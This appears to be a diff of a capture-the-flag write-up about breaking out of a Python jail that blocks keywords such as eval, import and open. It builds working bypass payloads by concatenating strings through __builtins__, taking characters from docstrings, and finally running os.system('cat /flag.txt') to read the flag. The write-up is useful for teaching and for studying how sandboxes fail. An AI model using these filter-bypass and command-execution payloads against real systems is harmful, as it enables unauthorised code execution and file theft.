@@ -28,9 +28,9 @@ So we know what is prohibited: `eval|import|open|with|as|from|lambda|print = |` 
 
 So to get around the forbidden `open` we could do something like:  `eval('op' + 'en'('flag.txt'))` but eval is forbidden as well.
 
-`__builtins__.__dict__['ev' + 'al']`
+A simple `__builtins__.__dict__['ev' + 'al']` will solve that, so now to the `(`.
 
-Will solve that, so now to the `(` we can just replace that with int.__doc__[3].
+Since it is a string it can be replaced with `int.__doc__[3]`.
 
 `__builtins__.__dict__['ev' + 'al']`('print' + int.__doc__[3] + 'op' + 'en' + int.__doc__[3] + '\'/flag.txt\')' + '.read' + int.__doc__[3] + '))')`
 
@@ -44,9 +44,9 @@ Let's try
 `p = 'print' + int.__doc__[3] + 'op' + 'en' + int.__doc__[3] + '\'/flag.txt\')' + '.read' + int.__doc__[3] + '))';  __builtins__.__dict__['print'] = __builtins__.__dict__['ev' + 'al']; print(p + "")`
 
 
-No answer... Debugging it locally gives me the flag, but via stderr since it throws an exception.
+No answer... debugging it locally gave me the flag via stderr while throwing an exception, but the server only forwards stdout.
 
-So I changed it the actual payload to: `os.system('cat /flag.txt')`
+So I changed the `open('/flag.txt').read()` part to `os.system('cat /flag.txt')`
 
 Resulting in: `p = '__builtins__.__i' + 'mport__' + int.__doc__[3] + '"os").system' + int.__doc__[3] + '"cat /flag.txt")'; __builtins__.__dict__['print'] = __builtins__.__dict__['ev' + 'al']; print(p)"` as the final payload.
 
